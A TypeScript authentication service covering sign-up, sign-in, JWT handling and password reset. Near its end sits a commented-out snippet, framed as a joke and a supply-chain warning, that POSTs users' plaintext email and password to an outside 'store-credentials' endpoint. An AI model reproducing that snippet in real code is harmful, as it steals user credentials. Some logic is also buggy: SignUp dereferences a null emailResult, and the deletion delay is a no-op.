import { Service, Inject } from 'typedi';

import jwt from 'jsonwebtoken';
import config from '../../config';
import argon2 from 'argon2';

//import MailerService from './mailer.ts.bak';

import IUserService from '../services/IServices/IUserService';
import { UserMap } from "../mappers/UserMap";
import { IUserDTO } from '../dto/IUserDTO';

import IUserRepo from './IRepos/IUserRepo';
import IRoleRepo from './IRepos/IRoleRepo';

import { Result } from "../core/logic/Result";
import IMailerService from './IServices/IMailerService';

import { setTimeout } from 'timers';
import { UserPassword } from '../domain/User/userPassword';
import { UserEmail } from '../domain/User/userEmail';
import { PhoneNumber } from '../domain/User/phoneNumber';
import { Role } from '../domain/Role/role';
import { User } from '../domain/User/user';




@Service()
export default class UserService implements IUserService{
  constructor(
      @Inject(config.repos.user.name) private userRepo : IUserRepo,
      @Inject(config.repos.role.name) private roleRepo : IRoleRepo,
      /* @Inject(config.services.mailer.name) private mailerService: IMailerService, */
      @Inject('logger') private logger,
  ) {}

  public async isAdmin(id: string): Promise<Result<boolean>> {
   try {
    const user = await this.userRepo.findByID(id);
    if (!user) {
      return Result.fail<boolean>("User not found");
    }
    const roleId = user.role.id.toString(); // Ensure it's a string
    const role = await this.roleRepo.findByDomainId(roleId);
    if (role.name === 'Admin'|| role.name === 'ADMIN') {
      return Result.ok<boolean>(true);
    }
    return Result.ok<boolean>(false);
    
   } catch (error) {
    return Result.fail<boolean>("Error while checking if user is admin"+ error);
   }
  }
  
  public async findStaff(): Promise<Result<IUserDTO[]>> {

    try {
      const staff = await this.userRepo.findStaff();
      if (!staff) {
        return Result.fail<IUserDTO[]>("Staff not found");
      }
      return Result.ok<IUserDTO[]>(staff.map((staff) => UserMap.toDTO(staff)) as IUserDTO[]);
      
    } catch (error) {

      return Result.fail<IUserDTO[]>("Error while finding staff"+ error);
    }
  }
  public async getUser(id: string): Promise<Result<IUserDTO>> {
    try {
      const user = await this.userRepo.findByID(id);
      if (!user) {
        return Result.fail<IUserDTO>("User not found");
      }
      return Result.ok<IUserDTO>(UserMap.toDTO(user) as IUserDTO);
      
    } catch (error) {
      return Result.fail<IUserDTO>("Error while finding user"+ error);
    }
  }

  
  
  public async confirmAccount(token:any): Promise<Result<void>> {
    try {
      const id = jwt.verify(token, config.jwtSecret) as {id: string};
      const user = await this.userRepo.findByID(id.id);
      //const user = await this.userRepo.findByEmail(email.email);
      if (!user) {
        return Result.fail<void>("User not found");
      }
      user.isEmailVerified = true;
      await this.userRepo.save(user);
      return Result.ok<void>(console.log('Welcome! Your account is now confirmed!'));
      
    } catch (error) {
      return Result.fail<void>(error);
    }

  }


  public async SignUp(userDTO: IUserDTO): Promise<Result<{ userDTO: IUserDTO, token: string }>> {
    try {
      const userDocument = await this.userRepo.findByEmail( userDTO.email );
      const found = !!userDocument;

      if (!userDTO.email || !userDTO.password || !userDTO.firstName || !userDTO.lastName) {
        return Result.fail<{ userDTO: IUserDTO, token: string }>("Missing required fields");
      }
  
      if (found) {
        return Result.fail<{userDTO: IUserDTO, token: string}>("User already exists: " + userDTO.email);
      }
      
      this.logger.silly('Hashing password');
      const hashedPassword = await argon2.hash(userDTO.password/* , { salt: randomBytes(32) } */);
      this.logger.silly('Creating user db record');

      const password = await UserPassword.create({ value: hashedPassword, hashed: true}).getValue();
      const email = await UserEmail.create( userDTO.email ).getValue();
      const phoneNumber = await PhoneNumber.create( userDTO.phoneNumber ).getValue();
      let role: Role;

      const roleOrError = await this.getRole(userDTO.role);
      if (roleOrError.isFailure) {
        //return Result.fail<{userDTO: IUserDTO; token: string}>(roleOrError.error);
        console.log('Setting default role: Client');
        role = (await this.getRole("6d819d9e-00d5-4f8f-918f-ab6ca951631b")).getValue();
        
      } else {
        role = roleOrError.getValue();
      }

      const userOrError = await User.create({
        firstName: userDTO.firstName,
        lastName: userDTO.lastName,
        email: email,
        phoneNumber: phoneNumber,
        role: role,
        password: password,
        isEmailVerified: false
      });

      if (userOrError.isFailure) {
        throw Result.fail<IUserDTO>(userOrError.errorValue());
      }
      const userResult = userOrError.getValue();
      //const token = this.generateToken(userResult);
      const token = this.generateConfirmationToken(userResult.id.toString());


      this.logger.silly('Sending confirmation email');
      const emailResult = null; //await this.mailerService.sendConfirmationEmail(userResult.email.value, userResult.firstName,token);



      if (emailResult.isSuccess) {
        //this.eventDispatcher.dispatch(events.user.signUp, { user: userResult });
        await this.userRepo.save(userResult);
        //this.DeleteUnconfirmedUser(userResult);
        const userDTOResult = UserMap.toDTO( userResult ) as IUserDTO;
        return Result.ok<{userDTO: IUserDTO, token: string}>( {userDTO: userDTOResult, token: token} )
        


      }else{
        return Result.fail<{ userDTO: IUserDTO, token: string }>("Failed to send welcome email");
      }


    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async DeleteUnconfirmedUser(user:User): Promise<void> {       
    try {
      setTimeout(() => {
        // runs after 2 seconds
      }, 1000*60*5); // 5 minutes

      if (user.isEmailVerified) {
        console.log('User is verified');
        return;
      }else{
        console.log('Deleting user');
        await this.userRepo.delete(user.id.toString());
      }
      
    } catch (error) {
      
    }
  }

  public async SignIn(email: string, password: string): Promise<Result<{ userDTO: IUserDTO, token: string }>> {
    const user = await this.userRepo.findByEmail(email);
  
    if (!user) {
      return Result.fail<{ userDTO: IUserDTO, token: string }>("User not registered");
    }

    if (!user.isEmailVerified){
      return Result.fail<{ userDTO: IUserDTO, token: string }>("Email not confirmed");
    }
  
    this.logger.silly('Checking password');
    const validPassword = await argon2.verify(user.password.value, password);
    
    if (!validPassword) {
      return Result.fail<{ userDTO: IUserDTO, token: string }>("Invalid Password");
    }
  
    this.logger.silly('Generating JWT');
    const token = this.generateToken(user);
    const userDTO = UserMap.toDTO(user) as IUserDTO;
  
    return Result.ok<{ userDTO: IUserDTO, token: string }>({ userDTO, token });
  }


  

  /* Se quiser garantir que um token não possa ser reutilizado após logout, usar uma lista de tokens revogados com Redis ou uma estrutura de dados simples em memória.
  Exemplo usando um Set em memória (para testar): */

  /* ✅ Motivo: Permite invalidar tokens sem esperar que expirem. Para produção, o ideal seria usar Redis. */

  private revokedTokens = new Set<string>();

  public async SignOut(token: string): Promise<Result<void>> { 
    try {
      this.logger.silly(`Revoking token: ${token}`);
      this.revokedTokens.add(token); // Adiciona à lista de tokens revogados
      return Result.ok<void>();
    } catch (e) {
      this.logger.error(e);
      return Result.fail<void>("Error during sign out");
    }
  }
  
  public isTokenRevoked(token: string): boolean {
    return this.revokedTokens.has(token);
  }

  private generateConfirmationToken(id: string): string {
    return jwt.sign({ id }, config.jwtSecret, {
      expiresIn: "6m", // Expira em 6 minutos
    });
  }

  private generateToken(user) {
    const today = new Date();
    const exp = new Date(today);
    exp.setDate(today.getDate() + 7); // 7 days

    /**
     * A JWT means JSON Web Token, so basically it's a json that is _hashed_ into a string
     * The cool thing is that you can add custom properties a.k.a metadata
     * Here we are adding the userId, role and name
     * Beware that the metadata is public and can be decoded without _the secret_
     * but the client cannot craft a JWT to fake a userId
     * because it doesn't have _the secret_ to sign it
     * more information here: https://softwareontheroad.com/you-dont-need-passport
     */
    this.logger.silly(`Sign JWT for userId: ${user._id}`);

    const id = user.id.toString();
    const email = user.email.value;
    const firstName = user.firstName;
    const lastName = user.lastName;
    const role = user.role.id.value;

    return jwt.sign(
      {
        id: id,
        email: email, // We are gonna use this in the middleware 'isAuth'
        role: role,
        firstName: firstName,
        lastName: lastName,
        exp: exp.getTime() / 1000,
      },
      config.jwtSecret,
    );
  }


  private async getRole (roleId: string): Promise<Result<Role>> {

    const role = await this.roleRepo.findByDomainId( roleId );
    const found = !!role;

    if (found) {
      return Result.ok<Role>(role);
    } else {
      return Result.fail<Role>("Couldn't find role by id=" + roleId);
    }
  }


 
public async ForgotPassword(email: string): Promise<Result<string>> {
  try {
    const user = await this.userRepo.findByEmail(email);

    if (!user) {
      return Result.fail<string>('User not found');
    }

    // Gerar um token de redefinição aleatório
    const resetToken = this.generateConfirmationToken(user.id.toString());

    // Salvar o token e a data de expiração no usuário
/*     user.setPasswordResetToken( resetToken, resetTokenExpires);
    await this.userRepo.save(user); */

    /* this.mailerService.sendPasswordResetEmail(email, resetToken); */

    return Result.ok<string>('Password reset link sent');
  } catch (error) {
    this.logger.error(error);
    return Result.fail<string>('Error processing password reset');
  }
}

public async ResetPassword(token: string, newPassword: string): Promise<Result<string>> { 
  try {
    const id = jwt.verify(token, config.jwtSecret) as { id: string };
    const user = await this.userRepo.findByID(id.id);

    if (!user) {
      return Result.fail<string>('Invalid or expired reset token');
    }

    // Gerar nova senha
    const hashedPassword = await argon2.hash(newPassword);

    const hashedUserPassword = await UserPassword.create({ value: hashedPassword, hashed: true }).getValue();
    user.updatePassword(hashedUserPassword);

    await this.userRepo.save(user);

    return Result.ok<string>('Password successfully reset');
  } catch (error) {
    this.logger.error(error);
    return Result.fail<string>('Error resetting password');
  }
} 

      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      

      /* No SignUp, está gerando um salt manualmente, mas o Argon2 já faz isso automaticamente. 
      Mas o código do salt pode ser: const salt = randomBytes(32); */

}
